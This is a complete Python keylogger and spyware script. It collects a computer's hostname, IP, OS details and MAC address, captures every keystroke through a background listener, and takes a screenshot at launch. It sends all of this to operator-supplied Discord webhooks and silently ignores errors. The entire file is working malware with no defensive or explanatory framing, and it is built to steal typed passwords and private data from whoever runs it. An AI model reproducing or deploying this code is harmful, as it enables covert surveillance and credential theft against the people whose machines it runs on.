import pyautogui
import requests
import io
import platform
import socket
import uuid
from pynput import keyboard
import threading

KEYLOG_WEBHOOK_URL = "enter the webhook for the keylogs to get sent to"
PCINFO_WEBHOOK_URL = "enter the webhook for the pc info to get sent to"
SCREENSHOT_WEBHOOK_URL = "emter the webhook for the screenshot to get sent to"

def send_to_discord(webhook_url, message=None, files=None):
    try:
        if message:
            data = {"content": message}
            if files:
                requests.post(webhook_url, data=data, files=files)
            else:
                requests.post(webhook_url, json=data)
        elif files:
            requests.post(webhook_url, files=files)
    except Exception as e:
        pass

def get_pc_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()
        mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                             for ele in range(0, 8 * 6, 8)][::-1])

        info = (
            f"PC Info:\n"
            f"Hostname: **{hostname}**\n"
            f"Local IP: **{local_ip}**\n"
            f"System: **{system}**\n"
            f"Release: **{release}**\n"
            f"Version: **{version}**\n"
            f"Machine: **{machine}**\n"
            f"Processor: **{processor}**\n"
            f"MAC Address: **{mac_addr}**"
        )
        return info
    except Exception as e:
        return f"Failed to get PC info: {e}"

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    send_to_discord(KEYLOG_WEBHOOK_URL, f"Key pressed: `{key_str}`")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def send_screenshot_to_discord():
    try:
        screenshot = pyautogui.screenshot()

        image_bytes = io.BytesIO()
        screenshot.save(image_bytes, format='PNG')
        image_bytes.seek(0)

        files = {
            "file": ("screenshot.png", image_bytes, "image/png")
        }
        data = {
            "content": "Screenshot taken after file launch."
        }

        response = requests.post(SCREENSHOT_WEBHOOK_URL, data=data, files=files)
        if response.status_code != 204:
            print(f"Failed to send screenshot: {response.status_code} {response.text}")
    except Exception as e:
        print(f"Error taking or sending screenshot: {e}")

if __name__ == "__main__":
    pc_info = get_pc_info()
    send_to_discord(PCINFO_WEBHOOK_URL, pc_info)

    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    send_screenshot_to_discord()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        pass
